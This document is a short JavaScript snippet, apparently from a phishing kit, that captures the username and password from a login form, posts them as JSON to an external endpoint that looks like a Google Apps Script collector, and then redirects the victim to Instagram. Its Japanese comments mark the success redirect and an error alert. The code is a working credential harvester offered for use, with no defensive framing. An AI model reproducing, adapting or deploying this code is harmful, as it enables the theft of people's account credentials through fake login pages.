document.getElementById("login-form").addEventListener("submit", function(e) {
  e.preventDefault();
  const name = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  fetch("<<AKfycbztO3GUpu9XloK2mwFZ8f_reVVULke6h8PfiHyNd6bIxADGiWftk338sSBc4EYFOWxXuQ>>", {
    method: "POST",
    body: JSON.stringify({
      name: name,
      password: password
    }),
    headers: {
      "Content-Type": "application/json"
    }
  }).then(res => {
    if (res.ok) {
      window.location.href = "Instagram.com"; // 成功後に飛ぶページ（任意）
    } else {
      alert("送信エラー");
    }
  });
});
